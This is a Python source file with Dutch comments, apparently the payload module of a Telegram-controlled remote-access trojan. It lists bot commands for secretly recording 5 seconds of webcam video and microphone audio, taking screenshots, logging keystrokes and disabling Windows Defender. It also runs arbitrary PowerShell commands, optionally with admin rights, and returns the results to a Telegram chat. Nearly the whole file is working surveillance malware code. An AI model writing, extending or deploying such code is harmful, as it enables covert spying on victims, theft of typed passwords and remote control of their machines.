# nested functies, deze functies hebben atom functies die daarbinnen aangeroepen worden
# Deze functies zijn Ready om binnen Async functies aangeroepen te worden
# de return van deze functies komen in de telegram chat
import cv2, time, subprocess, re, sounddevice, wavio
from PIL import ImageGrab
from pynput import keyboard
from atoms import *


def get_banner() -> str:
    """
    - import make_banner()
    - en zorgt ervoor dat alle tekens uitgeprint kunnen worden
    - return de banner
    """
    text = make_banner()
    # re.sub zorgt ervoor dat speciale tekens te zien zijn in markdown codeblock
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', text)

def get_command_list() -> str:
    """
    Geeft een lijst met alle slash commands die gebruikt kunnen worden
    """
    return r"""
Command Lijst:
/webcam         -   Maak een 5 seconde webcam opname
/ss             -   Maak een screenshot van het scherm
/stopdefender   -   Windows Defender uitgeschakelen
/keylog         -   luister naar keyboard toetsen totdat de gebruiker enter klikt
/listen         -   maak een 5 seconde geluidsopname
/customcommand  -   run een custom powershell command. type de command zo uit: /customcommand jou command
"""

def get_camRecording():
    """
    - Maak een 5 seconde webcam recording
    - slaat de video op m.b.v save_media_to()
    - return de path waar de video is opgeslagen
    """
    # source: https://www.geeksforgeeks.org/python/python-opencv-capture-video-from-camera/
    videoPath = save_media_to("cam", "mp4")

    # videoCapture functie: aangeven dat de webcam gebruikt moet/kan worden (camera met index 0)
    cam = cv2.VideoCapture(0)

    # melden en functie stoppen als camera niet geopend kan worden
    if not cam.isOpened():
        return print("Camera kan niet geopend worden!")

    # height en width van de video bepalen
    frame_width = int(cam.get(cv2.CAP_PROP_FRAME_WIDTH))
    frame_height = int(cam.get(cv2.CAP_PROP_FRAME_HEIGHT))

    # VideoWriter object aanmaken om de opname als mp4 op te slaan in de filepath=/media folder
    fourcc = cv2.VideoWriter_fourcc(*'avc1')
    out = cv2.VideoWriter(videoPath, fourcc, 20.0, (frame_width, frame_height))

    # zolang de whileloop true is wordt webcam gebruikt om video te maken
    start_time = time.time()
    while True:
        ret, frame = cam.read()

        out.write(frame)

        # als de video langer dan 5 seconden wordt, stop de video
        if time.time() - start_time > 5:
            break

    # als de loop stopt de camera opname afsluiten
    cam.release()
    out.release()
    cv2.destroyAllWindows()

    # return de video filepath zodat we hierna weten welke video naar de telegram chat verstuurd moet worden
    return videoPath

def get_screenshot():
    """
    - Maak een screenshot van het main scherm
    - slaat de image op m.b.v save_media_to()
    - return de path waar de image is opgeslagen
    """
    imagePath = save_media_to("screenshot", "png")
    screenshot = ImageGrab.grab()
    screenshot.save(imagePath, "PNG")

    return imagePath

def get_loggedKeys():
    """
    - start een keyboard listener
    - gebruikt log_a_string() om de keys in een list op te slaan
    - haalt alle aanhalings tekens uit de list
    - return een string van alle geklikte keys
    """
    # Collect events until released
    with keyboard.Listener(on_press=log_a_string) as listener:
        listener.join()
    
    send_string = ''.join(inputList).replace("'", "")

    # maak de lijst leeg voor de volgende keer
    inputList.clear()
    
    # return een list zonder aanhalings tekens
    return send_string

def get_audioFile():
    """
    - Maak een 5 seconde voice recording
    - slaat de audio file op m.b.v save_media_to()
    - return de path waar de audio file is opgeslagen
    """
    # https://www.geeksforgeeks.org/python/create-a-voice-recorder-using-python/
    # Sampling frequency
    freq = 44100

    # Recording duration
    duration = 5

    # Start recorder with the given values 
    # of duration and sample frequency
    recording = sounddevice.rec(int(duration * freq), samplerate=freq, channels=2)

    # Record audio for the given number of seconds
    sounddevice.wait()

    audioPath = save_media_to("audio", "wav")

    # Convert the NumPy array to audio file
    wavio.write(audioPath, recording, freq, sampwidth=2)

    return audioPath

def run_powershell_command(cmd, is_admin=False):
    """
    - gebruikt get_adminRights() om een powershell terminal met admin rechten op te starten
    - cmd: is de command die binnen die powershel terminal uitgevoerd moet worden
    - is_admin: is standaard op false als je de functie aanroept en als 2de argument 'True' zegt, dan wordeen admin rights toegevoegd
    - return is de resultaat van de powershell command die uitgevoerd is
    """
    # zet admin rechten aan als de functie is aangeroepen met admin rechten
    if is_admin:
        get_adminRights()

    # https://www.phillipsj.net/posts/executing-powershell-from-python/
    # dit is de powershell command die uitgevoerd moet worden (deze command heeft adim rights nodig)
    runCommand = subprocess.run(
        ["powershell", "-Command", cmd], 
        capture_output=True, text=True
    )

    return runCommand.stdout
